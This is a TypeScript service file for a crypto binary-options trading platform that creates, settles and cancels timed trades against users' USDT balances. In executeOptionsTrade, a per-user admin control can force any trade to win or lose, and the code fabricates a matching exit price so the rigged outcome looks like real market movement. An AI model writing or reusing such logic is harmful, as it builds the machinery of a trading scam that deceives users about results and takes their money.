import { storage } from './storage';
import { priceService } from './priceService';

interface TradeRequest {
  userId: string;
  symbol: string;
  direction: 'up' | 'down';
  amount: string;
  duration: number; // in seconds
}

interface TradeResult {
  success: boolean;
  trade?: any;
  message?: string;
}

class TradingService {
  private activeTrades = new Map<string, NodeJS.Timeout>();

  // Create a new options trade
  async createOptionsTrade(request: TradeRequest): Promise<TradeResult> {
    try {
      // Validate minimum amount based on duration
      const optionsSettings = await storage.getOptionsSettings();
      const setting = optionsSettings.find(s => s.duration === request.duration && s.isActive);
      
      if (!setting) {
        return {
          success: false,
          message: `Trading duration ${request.duration}s is not available`,
        };
      }

      const tradeAmount = parseFloat(request.amount);
      const minAmount = parseFloat(setting.minAmount);

      if (tradeAmount < minAmount) {
        return {
          success: false,
          message: `Minimum amount for ${request.duration}s is $${minAmount}`,
        };
      }

      // Check user balance
      const userBalance = await storage.getBalance(request.userId, 'USDT');
      if (!userBalance || parseFloat(userBalance.available) < tradeAmount) {
        return {
          success: false,
          message: 'Insufficient balance',
        };
      }

      // Get current market price
      const currentPrice = await priceService.getCurrentPrice(request.symbol);
      if (!currentPrice) {
        return {
          success: false,
          message: 'Unable to get current market price',
        };
      }

      // Lock the trade amount
      const newAvailable = (parseFloat(userBalance.available) - tradeAmount).toString();
      const newLocked = (parseFloat(userBalance.locked || '0') + tradeAmount).toString();
      await storage.updateBalance(request.userId, 'USDT', newAvailable, newLocked);

      // Create the trade
      const expiresAt = new Date(Date.now() + request.duration * 1000);
      const trade = await storage.createTrade({
        userId: request.userId,
        symbol: request.symbol,
        type: 'options',
        direction: request.direction,
        amount: request.amount,
        price: currentPrice,
        entryPrice: currentPrice,
        status: 'active',
        duration: request.duration,
        expiresAt,
      });

      // Schedule trade execution
      this.scheduleTradeExecution(trade.id, request.duration * 1000);

      return {
        success: true,
        trade,
        message: 'Trade created successfully',
      };
    } catch (error) {
      console.error('Error creating options trade:', error);
      return {
        success: false,
        message: 'Failed to create trade',
      };
    }
  }

  // Schedule automatic trade execution
  private scheduleTradeExecution(tradeId: string, delayMs: number): void {
    const timeout = setTimeout(async () => {
      await this.executeOptionsTrade(tradeId);
      this.activeTrades.delete(tradeId);
    }, delayMs);

    this.activeTrades.set(tradeId, timeout);
  }

  // Execute an options trade
  async executeOptionsTrade(tradeId: string): Promise<void> {
    try {
      const trade = await storage.getTrade(tradeId);
      if (!trade || trade.status !== 'active') {
        return;
      }

      // Check admin control for this user
      const adminControl = await storage.getAdminControl(trade.userId);
      const currentPrice = await priceService.getCurrentPrice(trade.symbol);
      
      if (!currentPrice) {
        console.error(`Cannot execute trade ${tradeId}: No current price available`);
        return;
      }

      let isWin = false;
      let exitPrice = currentPrice;

      // Apply admin control logic
      if (adminControl && adminControl.isActive) {
        switch (adminControl.controlType) {
          case 'win':
            isWin = true;
            // Adjust exit price to ensure win
            exitPrice = priceService.simulatePriceMovement(
              trade.entryPrice!,
              trade.direction as 'up' | 'down',
              0.1
            );
            break;
          case 'lose':
            isWin = false;
            // Adjust exit price to ensure loss
            const oppositeDirection = trade.direction === 'up' ? 'down' : 'up';
            exitPrice = priceService.simulatePriceMovement(
              trade.entryPrice!,
              oppositeDirection,
              0.1
            );
            break;
          case 'normal':
          default:
            // Use real market price
            if (trade.direction === 'up') {
              isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice!);
            } else {
              isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice!);
            }
            break;
        }
      } else {
        // No admin control, use real market logic
        if (trade.direction === 'up') {
          isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice!);
        } else {
          isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice!);
        }
      }

      // Calculate profit/loss
      const tradeAmount = parseFloat(trade.amount);
      const optionsSettings = await storage.getOptionsSettings();
      const setting = optionsSettings.find(s => s.duration === trade.duration);
      const profitPercentage = setting ? parseFloat(setting.profitPercentage) : 10;
      
      const profit = isWin ? tradeAmount * (profitPercentage / 100) : -tradeAmount;

      // Update trade
      await storage.updateTrade(tradeId, {
        status: 'completed',
        exitPrice,
        profit: profit.toString(),
        completedAt: new Date(),
      });

      // Update user balance
      const userBalance = await storage.getBalance(trade.userId, 'USDT');
      if (userBalance) {
        const newAvailable = parseFloat(userBalance.available) + tradeAmount + profit;
        const newLocked = parseFloat(userBalance.locked || '0') - tradeAmount;
        
        await storage.updateBalance(
          trade.userId, 
          'USDT', 
          Math.max(0, newAvailable).toString(), 
          Math.max(0, newLocked).toString()
        );
      }

      console.log(`Trade ${tradeId} executed: ${isWin ? 'WIN' : 'LOSS'}, Profit: $${profit.toFixed(2)}`);
    } catch (error) {
      console.error(`Error executing trade ${tradeId}:`, error);
    }
  }

  // Cancel a trade (if still active)
  async cancelTrade(tradeId: string, userId: string): Promise<boolean> {
    try {
      const trade = await storage.getTrade(tradeId);
      if (!trade || trade.userId !== userId || trade.status !== 'active') {
        return false;
      }

      // Cancel the scheduled execution
      const timeout = this.activeTrades.get(tradeId);
      if (timeout) {
        clearTimeout(timeout);
        this.activeTrades.delete(tradeId);
      }

      // Update trade status
      await storage.updateTrade(tradeId, {
        status: 'cancelled',
        completedAt: new Date(),
      });

      // Refund the locked amount
      const userBalance = await storage.getBalance(userId, 'USDT');
      if (userBalance) {
        const tradeAmount = parseFloat(trade.amount);
        const newAvailable = parseFloat(userBalance.available) + tradeAmount;
        const newLocked = parseFloat(userBalance.locked || '0') - tradeAmount;
        
        await storage.updateBalance(
          userId, 
          'USDT', 
          newAvailable.toString(), 
          Math.max(0, newLocked).toString()
        );
      }

      return true;
    } catch (error) {
      console.error(`Error cancelling trade ${tradeId}:`, error);
      return false;
    }
  }

  // Get active trades for a user
  async getActiveTrades(userId: string) {
    return storage.getActiveTrades(userId);
  }
}

export const tradingService = new TradingService();
